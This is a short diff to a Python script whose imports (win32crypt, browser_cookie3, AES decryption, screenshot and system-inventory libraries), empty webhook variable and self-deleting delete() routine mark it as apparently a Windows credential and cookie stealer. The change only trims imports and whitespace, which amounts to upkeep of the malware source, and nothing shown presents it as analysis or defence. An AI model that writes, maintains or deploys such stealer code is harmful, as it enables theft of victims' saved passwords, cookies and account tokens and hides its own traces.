@@ -24,30 +24,23 @@ SOFTWARE.
 
 import requests
 import socket
-import time
 import psutil
 import string
 import platform
 import subprocess
 import json
-import uuid
-import json
 import shutil
 import re
 import base64
 import random
-import sqlite3
-import win32crypt 
-import datetime
+import win32crypt
 import re
 import wmi
 import os
 import pyautogui
 import tempfile
 import sys
-import browser_cookie3
 from Crypto.Cipher import AES
-import ctypes
 
 h00k = ""
 
@@ -479,7 +472,7 @@ def delete():
     subprocess.Popen([
         sys.executable,
         "-c",
-        f"import os, time; time.sleep(1); os.remove(r'{self_path}')"
+        f"import os, time; time.sleep(1); os.remove(r'{self_path}')"             
     ])
     sys.exit()
 
